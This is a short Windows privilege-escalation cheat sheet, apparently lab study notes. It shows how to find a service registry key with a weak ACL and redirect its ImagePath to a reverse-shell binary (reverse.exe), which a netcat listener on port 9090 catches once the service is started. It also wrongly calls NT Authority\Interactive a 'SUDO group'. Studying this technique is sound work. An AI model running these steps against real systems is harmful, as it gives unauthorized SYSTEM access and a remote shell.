- - -
ACL= An access control list (ACL) is a list of rules that specifies which users or systems are granted or denied access to a particular object or system resource. Access control lists are used for controlling permissions to a computer system or computer network.

The windows registry stores entries for each service.

Since registry entries have ACLs, If the ACL is misconfigured, it may be possible to modify a service's configuration even if we cannot modify the service directly.
- - -

## Verifying Permissions :

Here For explanation ,
lets assume the service be ==>  `HKLM:\System\CurrentControlSet\Services\regsvc`

```powershell
powershell -exec bypass
```

```powershell
Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
```

```powershell
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

> [!Note] 
> At the ‘**NT Authority\Interective**’ Has Full control( KEY_ALL_ACCESS ) over the registry entry.

> [! What is "NT Authority\Interective" ?? ]  
> This is a SUDO group comprise to all users who can log-on to the syatem locally.
<br>

#### Do we have permissions to start the service.

```powershell
.\accesschk.exe /accepteula -ucqv user <service_name>
```

##### Also caheck the current values in the service registry entry. Note the Image-Path.

```powershell
reg query HKLM\System\CurrentControlSet\Services\regsvc
```

##### Change the image path.

```powershell
reg add HKLM\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\temp\reverse.exe /f
```

```sh
nc -nvlp 9090
```

```powershell
net start <service_name>
```
<br>

- - -

